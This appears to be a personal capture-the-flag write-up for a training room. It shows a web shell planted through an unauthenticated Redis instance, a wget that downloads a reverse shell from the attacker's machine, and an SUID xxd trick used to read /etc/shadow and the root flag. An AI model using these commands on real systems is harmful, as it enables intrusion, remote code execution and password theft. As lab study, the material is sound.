#redis #xxd

https://tryhackme.com/r/room/res

Resources
[Medium article on redis](https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419)

---
#### Nmap
![[Screenshot_2024-06-08_15-55-09.png]]

I connected to redis with
```shell
redis-cli -h 10.10.123.179
```

Redis uses a variable named `dir` to "navigate" in the filesystem, I can get my current `dir` with the following command:
```shell
config get dir
```
Then I can change `dir`'s location with
```shell
config set dir /var/www/html
```
Then I can create files and write some php in it to setup a LFI
```shell
config set dbfilename lfi.php

set test '<?php system($_GET["cmd"]); ?>'

save
```

Then I get my `LFI` on
```text
http://10.10.123.179/lfi.php?cmd=cat /etc/passwd
```

With this, I got the `vianka` username and his flag

I finally got a reverse shell by putting the monkey's on a file on my pc, then serve it with python and download it throught rce
```text
http://10.10.123.179/lfi.php?cmd=wget http://10.14.79.56:5050/monkey.php
```

After struggling, (maybe for too long?), I decided to use linpeas.sh to enumerate the target and it gave me the SUID on `xxd`

```shell
LFILE=/etc/shadow
xxd "$LFILE" | xxd -r
```
For `vianka`'s password and
```shell
LFILE=/root/root.txt
xxd "$LFILE" | xxd -r
```
For the root